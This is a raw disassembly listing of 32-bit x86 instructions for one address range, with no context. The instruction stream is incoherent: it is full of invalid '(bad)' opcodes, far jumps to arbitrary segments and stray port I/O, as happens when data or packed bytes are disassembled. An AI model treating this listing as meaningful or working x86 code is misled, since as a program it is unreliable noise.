  41f6ce:	add    dh,ah
  41f6d0:	inc    ecx
  41f6d1:	ror    DWORD PTR [edx],1
  41f6d3:	jnp    0x41f720
  41f6d5:	adc    BYTE PTR [edx+0x49],bh
  41f6d8:	test   DWORD PTR [edx+0xdc6baa9],0x77ecc678
  41f6e2:	and    BYTE PTR gs:0xf699cfc6,al
  41f6e9:	sbb    eax,0x6f03e746
  41f6ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6ef:	push   ebp
  41f6f0:	arpl   WORD PTR cs:[ecx-0x30],bp
  41f6f4:	sar    BYTE PTR [esi+0x2536eb3a],1
  41f6fa:	mov    ds:0xc6774f46,al
  41f6ff:	fcom   QWORD PTR [eax]
  41f701:	fld    QWORD PTR es:[eax]
  41f704:	jle    0x41f704
  41f706:	int3   
  41f707:	ins    BYTE PTR es:[edi],dx
  41f708:	mov    edi,0x6174b430
  41f70d:	jnp    0x41f757
  41f70f:	sbb    BYTE PTR [edi],0xe3
  41f712:	dec    ebx
  41f713:	xchg   esi,eax
  41f714:	mov    WORD PTR ds:0x5d8c74e8,fs
  41f71a:	xchg   DWORD PTR [ecx+0x597b3aaa],edi
  41f720:	jmp    0xeda3:0x316a8469
  41f727:	lock sub eax,0x5303ad8e
  41f72d:	popf   
  41f72e:	jb     0x41f70e
  41f730:	cmp    BYTE PTR [edi-0x1b],ch
  41f733:	push   0x2d
  41f735:	jne    0x41f729
  41f737:	test   BYTE PTR [esi+0x23d118d2],bh
  41f73d:	ret    0xbe11
  41f740:	pmullw mm6,mm0
  41f743:	inc    edx
  41f744:	mov    bl,0x4a
  41f746:	pop    eax
  41f747:	int3   
  41f748:	xor    ah,ah
  41f74a:	pop    esp
  41f74b:	lahf   
  41f74c:	cs loop 0x41f6fc
  41f74f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f750:	daa    
  41f751:	fdivr  st(1),st
  41f753:	out    0x34,eax
  41f755:	retf   0xbe3d
  41f758:	pop    esp
  41f759:	mov    ecx,0x1f1eb796
  41f75e:	inc    esi
  41f75f:	inc    esp
  41f760:	push   edi
  41f761:	sub    al,0xa
  41f763:	mov    ds:0xe29405c,al
  41f768:	dec    esi
  41f769:	ficom  WORD PTR [esi+esi*1-0x45]
  41f76d:	clc    
  41f76e:	repz or DWORD PTR [esi-0x32],ebp
  41f772:	fwait
  41f773:	gs ret 0x2519
  41f777:	in     al,dx
  41f778:	icebp  
  41f779:	push   edi
  41f77a:	inc    esi
  41f77b:	out    0x6e,al
  41f77d:	or     bh,bh
  41f77f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41f781:	xchg   ebx,eax
  41f782:	mov    al,0x60
  41f784:	cmp    BYTE PTR [ebx+0x60],0x4a
  41f788:	and    DWORD PTR [eax+0x432f3e64],ebp
  41f78e:	mov    ds:0x66577a16,eax
  41f793:	and    DWORD PTR [edi+0x13bacb0c],esi
  41f799:	cli    
  41f79a:	out    dx,eax
  41f79b:	into   
  41f79c:	lods   eax,DWORD PTR ds:[esi]
  41f79d:	xchg   ebp,eax
  41f79e:	retf   
  41f79f:	ret    
  41f7a0:	xor    DWORD PTR ds:0x65d61683,edi
  41f7a6:	mov    esp,0x8078736b
  41f7ab:	dec    eax
  41f7ac:	addr16 inc ecx
  41f7ae:	ret    
  41f7af:	adc    DWORD PTR [ecx-0x355d009f],edx
  41f7b5:	push   edi
  41f7b6:	sti    
  41f7b7:	pop    ecx
  41f7b8:	sbb    DWORD PTR [ebx+0x1],ecx
  41f7bb:	out    dx,eax
  41f7bc:	(bad)  [ebx-0xedec0b4]
  41f7c2:	or     dl,BYTE PTR [edx]
  41f7c4:	jmp    0x84de:0x52900cfd
  41f7cb:	repnz push edi
  41f7cd:	and    BYTE PTR [ebp+0x3e],0x42
  41f7d1:	inc    edi
  41f7d2:	adc    eax,0x72b1070a
  41f7d7:	adc    DWORD PTR [ebx-0x5ea5d7d0],esp
  41f7dd:	mov    al,0x3f
  41f7df:	adc    esi,DWORD PTR [ecx+0x7388f79d]
  41f7e5:	inc    ecx
  41f7e6:	add    BYTE PTR [esi],cl
  41f7e8:	adc    al,0x42
  41f7ea:	aas    
  41f7eb:	add    DWORD PTR [ebp+esi*8-0x7a],ebx
  41f7ef:	jl     0x41f787
  41f7f1:	ins    DWORD PTR es:[edi],dx
  41f7f2:	pop    ecx
  41f7f3:	adc    BYTE PTR [ebx],ch
  41f7f5:	mov    bh,0xb7
  41f7f7:	cmp    cl,cl
  41f7f9:	gs js  0x41f79b
  41f7fc:	daa    
  41f7fd:	pop    ss
  41f7fe:	add    al,0x3c
  41f800:	xor    ecx,DWORD PTR [eax+ecx*2+0xe61d280]
  41f807:	mov    dl,0xe2
  41f809:	fmul   st,st(7)
  41f80b:	dec    ebp
  41f80c:	cmp    BYTE PTR [edi-0x22],ah
  41f80f:	pop    ebp
  41f810:	jle    0x41f7df
  41f812:	jge    0x41f823
  41f814:	lods   eax,DWORD PTR ds:[esi]
  41f815:	fimul  DWORD PTR [ecx+0x3b]
  41f818:	jns    0x41f88a
  41f81a:	add    eax,0x7e00e733
  41f81f:	xor    DWORD PTR [ebp+edx*2-0x577c5ef8],0xffffff89
  41f827:	sub    al,0x4c
  41f829:	lods   eax,DWORD PTR ds:[esi]
  41f82a:	mov    ah,0xbb
  41f82c:	push   0x511fede2
  41f831:	lahf   
  41f832:	mov    ds:0x4c32337e,eax
  41f837:	add    al,0x3b
  41f839:	mov    ch,0xf8
  41f83b:	iret   
  41f83c:	and    al,0x87
  41f83e:	fst    st(3)
  41f840:	fdivp  st(3),st
  41f842:	sbb    esp,DWORD PTR [eax+0x4dc603f2]
  41f848:	mov    al,0xbb
  41f84a:	inc    edx
  41f84b:	dec    ebp
  41f84c:	imul   esi,DWORD PTR [ecx],0xffffff83
  41f84f:	adc    dh,BYTE PTR [ebx+0x71]
  41f852:	xor    DWORD PTR [edx],ebx
  41f854:	retf   
  41f855:	mov    ch,0x67
  41f857:	pop    edi
  41f858:	ins    BYTE PTR es:[edi],dx
  41f859:	push   ebx
  41f85a:	and    al,0x62
  41f85c:	jnp    0x41f824
  41f85e:	data16 hlt 
  41f860:	iret   
  41f861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f862:	test   BYTE PTR [esi+ecx*2+0x9],0xe7
  41f867:	(bad)  
  41f868:	push   0xcf7b99d5
  41f86d:	retf   0x3161
  41f870:	arpl   WORD PTR [edx+0x45a398e0],si
  41f876:	call   0x1bb2dc12
  41f87b:	sbb    al,0xdf
  41f87d:	leave  
  41f87e:	sbb    BYTE PTR [edi],ch
  41f880:	push   ebx
  41f882:	mov    BYTE PTR [ebx-0x12],dh
  41f885:	add    dl,bh
  41f887:	jae    0x41f882
  41f889:	fs in  eax,0x37
  41f88c:	lock loop 0x41f87f
  41f88f:	test   esp,0x57ef318e
  41f895:	gs int3 
  41f897:	out    dx,al
  41f898:	push   0x40
  41f89a:	icebp  
  41f89b:	adc    DWORD PTR [edi+0x62],esp
  41f89e:	xor    al,BYTE PTR [ebp-0x40]
  41f8a1:	in     al,dx
  41f8a2:	les    esp,FWORD PTR [esi+ecx*1+0x36]
  41f8a6:	push   esi
  41f8a7:	mov    fs,WORD PTR ss:[edi-0x80]
  41f8ab:	fisttp WORD PTR [edi-0x73eafb98]
  41f8b1:	(bad)  
  41f8b2:	das    
  41f8b3:	pop    ebx
  41f8b4:	inc    esi
  41f8b5:	cdq    
  41f8b6:	repz mov bh,0xbf
  41f8b9:	aam    0x20
  41f8bb:	mov    eax,0xd21cdaa5
  41f8c0:	xchg   ebx,eax
  41f8c1:	fwait
  41f8c2:	sbb    DWORD PTR [ecx+0x21],ebp
  41f8c5:	in     eax,0xc5
  41f8c7:	cmp    DWORD PTR [edx],edx
  41f8c9:	(bad)  
  41f8ca:	add    DWORD PTR [eax+eiz*8+0x1b0145b],ebx
  41f8d1:	lahf   
  41f8d2:	jne    0x41f916
  41f8d4:	(bad)  
  41f8d5:	lds    ebp,FWORD PTR [ebx+ebx*2-0xb]
  41f8d9:	sahf   
  41f8da:	push   esp
  41f8db:	daa    
  41f8dc:	ds pop es
  41f8de:	test   edx,ebp
  41f8e0:	dec    edi
  41f8e1:	ins    BYTE PTR es:[edi],dx
  41f8e2:	pop    esi
  41f8e3:	lods   eax,DWORD PTR ds:[esi]
  41f8e4:	pushf  
  41f8e5:	ins    DWORD PTR es:[edi],dx
  41f8e6:	inc    edx
  41f8e7:	jb     0x41f931
  41f8e9:	rol    BYTE PTR [eax+0x1a1d6bd2],cl
  41f8ef:	jae    0x41f90b
  41f8f1:	dec    edx
  41f8f2:	(bad)  
  41f8f3:	hlt    
  41f8f4:	loop   0x41f892
  41f8f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8f7:	mov    al,0x5c
  41f8f9:	cmp    BYTE PTR [edx-0x49],ch
  41f8fc:	dec    ebp
  41f8fd:	ins    DWORD PTR es:[edi],dx
  41f8fe:	mov    eax,0x119f6794
  41f903:	inc    eax
  41f904:	test   eax,eax
  41f906:	in     eax,0x76
  41f908:	cmova  esp,edx
  41f90b:	dec    edx
  41f90c:	daa    
  41f90d:	fneni(8087 only) 
  41f90f:	fdiv   st,st(6)
  41f911:	jno    0x41f905
  41f913:	add    eax,0xcaae93c9
  41f918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f919:	ret    
  41f91a:	mov    ebx,0x7751a515
  41f91f:	mov    edi,0x2ebaa95
  41f924:	out    0x4,eax
  41f926:	cmp    BYTE PTR [bx-0x6278],ch
  41f92b:	xchg   esp,eax
  41f92c:	mov    dl,0x61
  41f92e:	xlat   BYTE PTR ds:[ebx]
  41f92f:	ds pop ebp
  41f931:	addr16 dec esi
  41f933:	adc    ebp,DWORD PTR [edi]
  41f935:	jnp    0x41f955
  41f937:	dec    ecx
  41f938:	mov    ebp,0x9ed7fb75
  41f93d:	aad    0xa4
  41f93f:	mov    ds:0x40a4c9df,eax
  41f944:	jnp    0x41f969
  41f946:	pushfw 
  41f948:	push   esi
  41f949:	test   BYTE PTR [ebp-0x58],bl
  41f94c:	data16 jp 0x41f94e
  41f94f:	ja     0x41f8de
  41f951:	test   DWORD PTR [ebx-0x3e],edx
  41f954:	xor    ebx,DWORD PTR [eax]
  41f956:	inc    edx
  41f957:	jae    0x41f91e
  41f959:	div    ecx
  41f95b:	mov    WORD PTR [esi+0x409ccd76],ss
  41f961:	aas    
  41f962:	sub    BYTE PTR [esi+esi*8-0x19],dh
  41f966:	or     BYTE PTR [ecx+0x54],dl
  41f969:	mov    edi,0xd445a665
  41f96e:	retf   
  41f96f:	das    
  41f970:	sbb    eax,0xb3d57f48
  41f975:	inc    edi
  41f976:	mov    ch,0x95
  41f978:	outs   dx,BYTE PTR ds:[esi]
  41f979:	add    eax,0xf77f7101
  41f97e:	xor    al,0x91
  41f980:	repz push edi
  41f982:	and    al,0x22
  41f984:	pop    ecx
  41f985:	mov    ds:0x1e005a6a,al
  41f98a:	add    cl,dl
  41f98c:	mov    edx,0xc068f3f
  41f991:	xor    ebp,0xffffffc8
  41f994:	in     al,dx
  41f995:	or     DWORD PTR [edx],ebx
  41f997:	inc    edx
  41f998:	mov    ah,0xb6
  41f99a:	jns    0x41f9a0
  41f99c:	mov    bh,0x4f
  41f99e:	(bad)  
  41f99f:	leave  
  41f9a0:	mov    dh,BYTE PTR [edx+0x76]
  41f9a3:	cmp    eax,0xafedaa32
  41f9a8:	xchg   ecx,eax
  41f9a9:	cmp    al,ah
  41f9ab:	add    eax,0x6c4e91ea
  41f9b0:	js     0x41f9c2
  41f9b2:	and    eax,0xfdffdeab
  41f9b7:	(bad)  
  41f9b8:	mov    dl,0x38
  41f9ba:	ja     0x41f9de
  41f9bc:	jle    0x41f9a1
  41f9be:	sbb    al,0x6
  41f9c0:	sbb    ah,BYTE PTR [ebp-0x64abae60]
  41f9c6:	jmp    0x1c86b3a7
  41f9cb:	das    
  41f9cc:	test   BYTE PTR [esi],0xd3
  41f9cf:	mov    edx,0x5fa6dc43
  41f9d4:	adc    DWORD PTR [edx],esp
  41f9d6:	push   cs
  41f9d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9d8:	mov    ds:0x6327b5b3,eax
  41f9dd:	in     al,dx
  41f9de:	sti    
  41f9df:	cmp    eax,0x79f3eee5
  41f9e4:	out    dx,eax
  41f9e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9e6:	jns    0x41f9a8
  41f9e8:	inc    esi
  41f9e9:	xchg   ebp,eax
  41f9ea:	adc    dl,BYTE PTR [eax+0x5c59cde7]
  41f9f0:	inc    eax
  41f9f1:	and    BYTE PTR [ecx-0x27],cl
  41f9f4:	sub    BYTE PTR [ecx-0x7cf313e0],bl
  41f9fa:	push   es
  41f9fb:	mov    edx,DWORD PTR [ebx-0x3ef1617]
  41fa01:	mov    DWORD PTR [ebp-0x50fe7033],0x48687d41
  41fa0b:	mov    bh,0xd1
  41fa0d:	repz rep lods eax,DWORD PTR ds:[esi]
  41fa10:	pop    ebx
  41fa11:	sbb    cl,BYTE PTR [eax]
  41fa13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa14:	rol    BYTE PTR [ecx+0x1ac8b2b6],1
  41fa1a:	stos   BYTE PTR es:[edi],al
  41fa1b:	out    dx,al
  41fa1c:	es push edx
  41fa1e:	add    eax,0x17bb308e
  41fa23:	dec    ecx
  41fa24:	sub    al,0x3f
  41fa26:	into   
  41fa27:	and    eax,0x291df330
  41fa2c:	mov    cl,0x5e
  41fa2e:	adc    al,0x66
  41fa30:	dec    eax
  41fa31:	and    DWORD PTR [edi-0x41a38ba5],esi
  41fa37:	ret    
  41fa38:	xchg   edx,edx
  41fa3a:	lds    edx,FWORD PTR [ecx]
  41fa3c:	push   ebx
  41fa3d:	test   BYTE PTR [ecx+ebp*1-0x64],cl
  41fa41:	adc    esp,esi
  41fa43:	std    
  41fa44:	cwde   
  41fa45:	fsubr  st(5),st
  41fa47:	fbstp  TBYTE PTR [esi+0x4b6b307c]
  41fa4d:	adc    eax,0x351a28db
  41fa52:	fmulp  st(6),st
  41fa54:	sub    dl,BYTE PTR [edi+0x1bd4cd3]
  41fa5a:	cmp    ch,BYTE PTR [edx-0x21]
  41fa5d:	or     al,BYTE PTR [eax]
  41fa5f:	lea    esp,[ebp-0x14e4d4b5]
  41fa65:	jnp    0x41f9e8
  41fa67:	dec    edx
  41fa68:	add    al,dh
  41fa6a:	push   esi
  41fa6b:	add    eax,0x3fe7f161
  41fa70:	xlat   BYTE PTR ds:[ebx]
  41fa71:	mov    eax,0xe51f7e94
  41fa76:	imul   esi,esp,0xf4643537
  41fa7c:	push   esp
  41fa7d:	mov    dh,0xa2
  41fa7f:	sbb    ecx,DWORD PTR [edx+0x7f7358a4]
  41fa85:	jne    0x41fafc
  41fa87:	popa   
  41fa88:	cli    
  41fa89:	sbb    BYTE PTR [eax+0x29],ch
  41fa8c:	jg     0x41fad1
  41fa8e:	lock or BYTE PTR [ebp+edx*2-0x6e],al
  41fa93:	and    al,0x84
  41fa95:	ja     0x41fac9
  41fa97:	aam    0x8c
  41fa99:	test   al,0xc
  41fa9b:	pop    ds
  41fa9c:	dec    ebp
  41fa9d:	or     ebx,edi
  41fa9f:	mov    ch,0xde
  41faa1:	loop   0x41fad1
  41faa3:	sbb    al,0x12
  41faa5:	hlt    
  41faa6:	test   eax,0x91dabe13
  41faab:	test   ah,cl
  41faad:	(bad)  
  41faae:	push   ds
  41faaf:	mov    bh,BYTE PTR [eax+0x51c6eb29]
  41fab5:	daa    
  41fab6:	inc    edi
  41fab7:	jbe    0x41fa6a
  41fab9:	jge    0x41fa96
  41fabb:	loop   0x41fac0
  41fabd:	pop    eax
  41fabe:	mov    ah,0x3e
  41fac0:	scas   eax,DWORD PTR es:[edi]
  41fac1:	or     eax,0x7f28e0f2
  41fac6:	call   0xee4a:0xee2017bc
  41facd:	dec    esp
  41face:	(bad)  
  41facf:	aas    
  41fad0:	push   ss
  41fad1:	mov    BYTE PTR [esi],bh
  41fad3:	push   eax
  41fad4:	jg     0x41fac3
  41fad6:	or     al,0x3e
  41fad8:	push   eax
  41fad9:	adc    DWORD PTR [ebp*1-0x5a62ef7a],esi
  41fae0:	aad    0xa
  41fae2:	mov    ecx,0x2c59731c
  41fae7:	and    esp,DWORD PTR [ebx+0x60]
  41faea:	mov    ch,0xfa
  41faec:	sub    al,0x3a
  41faee:	(bad)  [edx+0x72]
  41faf1:	cmp    BYTE PTR [edx+0x777c4c9f],0x92
  41faf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faf9:	enter  0x98fa,0x32
  41fafd:	enter  0xcf3b,0x51
  41fb01:	or     BYTE PTR [edi-0x134174bf],al
  41fb07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb08:	loope  0x41fad1
  41fb0a:	mov    al,ds:0x3ed16716
  41fb0f:	dec    esi
  41fb10:	and    eax,0xea3a5944
  41fb15:	or     eax,0xc66eb6d5
  41fb1a:	retf   
  41fb1b:	mov    bl,0x53
  41fb1d:	xchg   edi,eax
  41fb1e:	xchg   esi,eax
  41fb1f:	rcl    BYTE PTR [ebx],1
  41fb21:	je     0x41fb07
  41fb23:	xchg   dh,ch
  41fb25:	out    dx,al
  41fb26:	mov    al,ds:0x24dccd1a
  41fb2b:	mov    dh,0xd1
  41fb2d:	sar    BYTE PTR [ebx-0x35],cl
  41fb30:	cmp    DWORD PTR ds:0xeacc14d6,0xaae84198
  41fb3a:	sar    DWORD PTR [eax+esi*2-0x7a],0xf
  41fb3f:	dec    BYTE PTR [ebx+0x7e096b85]
  41fb45:	lock mov esp,0xbd1081d4
  41fb4b:	mov    edx,0xa437b65e
  41fb51:	pop    edx
  41fb52:	cs out 0x52,al
  41fb55:	sub    dh,BYTE PTR [edx+eiz*4-0x11924dfc]
  41fb5c:	push   ss
  41fb5d:	gs jl  0x41fbcb
  41fb60:	pop    esi
  41fb61:	fidiv  DWORD PTR [ebp+0x27]
  41fb64:	mov    ecx,0xf2a0dd7b
  41fb69:	mov    cl,0xaa
  41fb6b:	and    DWORD PTR [eax-0x3d4abd63],esi
  41fb71:	ror    DWORD PTR [ecx+0x67],0xcb
  41fb75:	jnp    0x41fb9c
  41fb77:	ret    
  41fb78:	push   0xb6da81ec
  41fb7d:	jmp    0x41fbc0
  41fb7f:	pusha  
  41fb80:	sti    
  41fb81:	jge    0x41fb96
  41fb83:	add    DWORD PTR [ebx+0x6fc6728e],ebx
  41fb89:	xchg   ecx,eax
  41fb8a:	push   ebx
  41fb8b:	ret    0x468f
  41fb8e:	popf   
  41fb8f:	push   0x51
  41fb91:	mov    dh,0xb5
  41fb93:	cmp    ch,BYTE PTR [ecx+0x55457906]
  41fb99:	(bad)  
  41fb9a:	nop
  41fb9b:	adc    DWORD PTR [ecx-0x49afa211],esp
  41fba1:	fcmovb st,st(3)
  41fba3:	dec    esp
  41fba4:	adc    BYTE PTR ds:0xf311cb0,dl
  41fbaa:	test   DWORD PTR [ecx],ebx
  41fbac:	or     eax,ebx
  41fbae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbaf:	mov    ebp,0x2058453c
  41fbb4:	mov    eax,0x21dd0cee
  41fbb9:	not    BYTE PTR [esi-0x1293ed8b]
  41fbbf:	push   ebx
  41fbc0:	sti    
  41fbc1:	jbe    0x41fc3e
  41fbc3:	scas   eax,DWORD PTR es:[edi]
  41fbc4:	mov    esp,0x9bc80b78
  41fbc9:	mov    dh,dh
  41fbcb:	push   edi
  41fbcc:	call   0xb94b00b7
  41fbd1:	sbb    eax,0x72d1bd5b
  41fbd6:	call   0x1d38:0xc0818d19
  41fbdd:	je     0x41fc0d
  41fbdf:	add    ebp,edx
  41fbe1:	iret   
  41fbe2:	push   esp
  41fbe3:	test   BYTE PTR [eax+0x47],bh
  41fbe6:	or     DWORD PTR [ebp-0x156f9706],edx
  41fbec:	dec    ecx
  41fbed:	jl     0x41fb91
  41fbef:	je     0x41fba0
  41fbf1:	ret    0x6be5
  41fbf4:	sub    esp,edi
  41fbf6:	sbb    BYTE PTR [ecx-0x43],bh
  41fbf9:	in     al,0xbf
  41fbfb:	pop    ds
  41fbfc:	jmp    0xe395:0x4ff64806
  41fc03:	mov    ds:0xb19aab44,eax
  41fc08:	sub    al,0xd3
  41fc0a:	loope  0x41fbf9
  41fc0c:	lds    esi,FWORD PTR [ebx-0x60033cb7]
  41fc12:	nop
  41fc13:	mov    ds:0x993334d2,al
  41fc18:	lods   al,BYTE PTR ds:[esi]
  41fc19:	into   
  41fc1a:	loop   0x41fc7b
  41fc1c:	retf   0x851a
  41fc1f:	xor    BYTE PTR [esi+0x1d],al
  41fc22:	test   DWORD PTR [ecx+0x6d],0xb45a2d9f
  41fc29:	mov    ecx,0xdff9c46
  41fc2e:	aam    0x6a
  41fc30:	ins    BYTE PTR es:[edi],dx
  41fc31:	std    
  41fc32:	cli    
  41fc33:	cld    
  41fc34:	mov    al,0xf4
  41fc36:	mov    bh,0x75
  41fc38:	push   ebx
  41fc39:	hlt    
  41fc3a:	out    0xc9,eax
  41fc3c:	mov    bh,0x42
  41fc3e:	xchg   ah,cl
  41fc40:	pushf  
  41fc41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc42:	sbb    al,BYTE PTR [ebp-0x61794ab4]
  41fc48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc49:	mov    al,ds:0x88d83e64
  41fc4e:	mov    cl,dh
  41fc50:	dec    esp
  41fc51:	mov    ebx,0xee0592be
  41fc56:	xchg   ecx,eax
  41fc57:	sti    
  41fc58:	xchg   ebp,eax
  41fc59:	fcomp  st(4)
  41fc5b:	push   eax
  41fc5c:	into   
  41fc5d:	inc    esp
  41fc5e:	out    0x9e,al
  41fc60:	stos   BYTE PTR es:[edi],al
  41fc61:	add    esp,edx
  41fc63:	mov    bh,al
  41fc65:	fld    DWORD PTR [eax+0x60]
  41fc68:	jecxz  0x41fbfe
  41fc6a:	daa    
  41fc6b:	stc    
  41fc6c:	sbb    edi,0x48
  41fc6f:	(bad)  
  41fc70:	(bad)  
  41fc71:	out    dx,al
  41fc72:	cli    
  41fc73:	mov    esi,0xd42e3758
  41fc78:	pop    es
  41fc79:	push   0xfffffff5
  41fc7b:	jno    0x41fc6b
  41fc7d:	mov    bh,0x87
  41fc7f:	xor    ch,BYTE PTR [bx+0x13dd]
  41fc84:	pop    es
  41fc85:	jge    0x41fc94
  41fc87:	mov    DWORD PTR [eax-0x15819365],ebx
  41fc8d:	and    bh,BYTE PTR [eax+0x3f18359]
  41fc93:	ins    BYTE PTR es:[edi],dx
  41fc94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc95:	lahf   
  41fc96:	pop    edi
  41fc97:	adc    eax,0x2f4ca544
  41fc9c:	inc    ebx
  41fc9d:	enter  0x54f4,0x4
  41fca1:	inc    esp
  41fca2:	shr    cl,1
  41fca4:	stos   BYTE PTR es:[edi],al
  41fca5:	add    edi,eax
  41fca7:	lds    esi,FWORD PTR [eax+0x3418cdd1]
  41fcad:	dec    ebx
  41fcae:	popf   
  41fcaf:	pop    ss
  41fcb0:	adc    eax,esp
  41fcb2:	xor    BYTE PTR [ebx-0x74fa6463],0x49
  41fcb9:	stos   DWORD PTR es:[edi],eax
  41fcba:	sti    
  41fcbb:	sbb    al,0xfd
  41fcbd:	adc    ah,BYTE PTR [edi+0x40]
  41fcc0:	out    0x4a,eax
  41fcc2:	mov    ecx,0x36bd8655
  41fcc7:	pop    ebx
  41fcc8:	neg    DWORD PTR [esi-0x59]
  41fccb:	popf   
  41fccc:	imul   ecx,DWORD PTR [esi],0xffffff85
  41fccf:	js     0x41fc68
  41fcd1:	push   ss
  41fcd2:	int    0x57
  41fcd4:	scas   al,BYTE PTR es:[edi]
  41fcd5:	inc    eax
  41fcd6:	test   ch,ch
  41fcd8:	addr16 push esp
  41fcda:	adc    al,0xaf
  41fcdc:	sub    al,0x48
  41fcde:	xor    DWORD PTR [eax+0x1b],0xffffffb9
  41fce2:	push   ebp
  41fce3:	mov    dh,0xf6
  41fce5:	(bad)  
  41fce7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fce8:	sbb    eax,0xd3715ede
  41fced:	and    eax,DWORD PTR [eax+esi*4]
  41fcf0:	(bad)  
  41fcf1:	imul   eax,DWORD PTR [ebp+0x4c],0x29
  41fcf5:	stc    
  41fcf6:	dec    ecx
  41fcf7:	(bad)  
  41fcf8:	cli    
  41fcf9:	test   al,0x6d
  41fcfb:	cmp    al,ah
  41fcfd:	scas   eax,DWORD PTR es:[edi]
  41fcfe:	add    al,0xbf
  41fd00:	shr    cl,cl
  41fd02:	adc    DWORD PTR [eax-0x71],esp
  41fd05:	fstp   DWORD PTR [esi-0xf]
  41fd08:	pop    ds
  41fd09:	ds pop ecx
  41fd0b:	mov    eax,0x66fbfdbf
  41fd10:	jns    0x41fd6d
  41fd12:	adc    eax,0x4a3a3a12
  41fd17:	mov    al,ds:0x9df960df
  41fd1c:	jne    0x41fcd5
  41fd1e:	dec    ebp
  41fd1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd20:	mov    dl,0x39
  41fd22:	pop    ebp
  41fd23:	inc    ebx
  41fd24:	add    esi,0x7a
  41fd27:	fs loop 0x41fccc
  41fd2a:	cli    
  41fd2b:	frstor [esi-0x2f65e52]
  41fd31:	neg    DWORD PTR [edx+edi*8+0x18]
  41fd35:	jnp    0x41fcf9
  41fd37:	xchg   edi,eax
  41fd38:	int    0xf0
  41fd3a:	push   ss
  41fd3b:	repz inc esp
  41fd3d:	pop    DWORD PTR [esi]
  41fd3f:	enter  0x6cf0,0x7
  41fd43:	mov    dh,BYTE PTR [edi+0x56]
  41fd46:	cmp    ah,BYTE PTR [ebx-0x57670351]
  41fd4c:	dec    edx
  41fd4d:	push   0xffffffc1
  41fd4f:	in     eax,0x70
  41fd51:	fcomp  QWORD PTR [esp+eiz*8]
  41fd54:	xor    ecx,DWORD PTR [edx+esi*8]
  41fd57:	scas   eax,DWORD PTR es:[edi]
  41fd58:	cs out dx,al
  41fd5a:	aad    0x7d
  41fd5c:	lods   eax,DWORD PTR ds:[esi]
  41fd5d:	arpl   WORD PTR [ebp+0x46],dx
  41fd60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd61:	fstp   QWORD PTR [edi-0x48]
  41fd64:	xchg   esp,eax
  41fd65:	push   ebx
  41fd66:	sbb    ebx,0x16a927b5
  41fd6c:	das    
  41fd6d:	lock xchg ebp,eax
  41fd6f:	and    al,0x9f
  41fd71:	lea    ebp,ds:0x9f81d793
  41fd77:	scas   al,BYTE PTR es:[edi]
  41fd78:	repz (bad) 
  41fd7a:	fadd   st,st(3)
  41fd7c:	inc    eax
  41fd7d:	pop    ebx
  41fd7e:	mov    esp,0x3137917d
  41fd83:	(bad)  
  41fd84:	into   
  41fd85:	push   es
  41fd86:	push   edi
  41fd87:	mov    cl,0x35
  41fd89:	retf   
  41fd8a:	(bad)  
  41fd8b:	gs mov dh,0xe3
  41fd8e:	add    eax,DWORD PTR [edi+ebx*4+0x928e4d8]
  41fd95:	pop    ds
  41fd96:	dec    ebp
  41fd97:	not    BYTE PTR [ebx]
  41fd99:	psrld  mm7,QWORD PTR [ecx]
  41fd9c:	hlt    
  41fd9d:	neg    BYTE PTR [ecx+ebx*2]
  41fda0:	or     ch,BYTE PTR [eax+esi*8]
  41fda3:	imul   ebx,ebx,0x7a033c83
  41fda9:	jp     0x41fd42
  41fdab:	ins    DWORD PTR es:[edi],dx
  41fdac:	or     edx,DWORD PTR [ebx]
  41fdae:	(bad)  
  41fdaf:	jl     0x41fd7a
  41fdb1:	std    
  41fdb2:	aaa    
  41fdb3:	mov    esp,0x3e1ba9f8
  41fdb8:	adc    edx,DWORD PTR [eax+0x3ba7155b]
  41fdbe:	jne    0x41fd7e
  41fdc0:	xchg   edi,eax
  41fdc1:	sbb    BYTE PTR [ecx],0xe
  41fdc4:	pusha  
  41fdc5:	cli    
  41fdc6:	in     al,0xc3
  41fdc8:	cmp    DWORD PTR [edx+esi*4+0x4857cf2f],edi
  41fdcf:	and    al,0xc0
  41fdd1:	addr16 mov edx,0xd25250fa
  41fdd7:	sub    BYTE PTR ds:0xf8d0d9fa,0x7e
  41fdde:	cmp    BYTE PTR [bp+di-0x1c],bh
  41fde2:	mov    bh,al
  41fde4:	retf   
  41fde5:	ins    BYTE PTR es:[edi],dx
  41fde6:	mov    ch,0xdc
  41fde8:	stos   BYTE PTR es:[edi],al
  41fde9:	jae    0x41fe19
  41fdeb:	jl     0x41fe62
  41fded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdee:	sub    al,0xfa
  41fdf0:	sub    BYTE PTR [eax+0x59f1ad60],dh
  41fdf6:	psllw  mm6,mm4
  41fdf9:	retf   
  41fdfa:	mov    ah,0x70
  41fdfc:	fistp  QWORD PTR [ebx]
  41fdfe:	xor    ax,0x1fd0
  41fe02:	pop    esi
  41fe03:	mov    eax,ds:0x21f8b656
  41fe08:	sub    edi,DWORD PTR [ebx-0x38fa150e]
  41fe0e:	fdivr  DWORD PTR [edi-0x21]
  41fe11:	xchg   ecx,eax
  41fe12:	shl    BYTE PTR [edx+0x15],0x9
  41fe16:	pop    edx
  41fe17:	rcr    BYTE PTR [eax+0x6db8dcd6],1
  41fe1d:	push   ecx
  41fe1e:	push   ebx
  41fe1f:	adc    eax,DWORD PTR [edx+edi*8-0x4c]
  41fe23:	mov    ds:0xc4b33079,eax
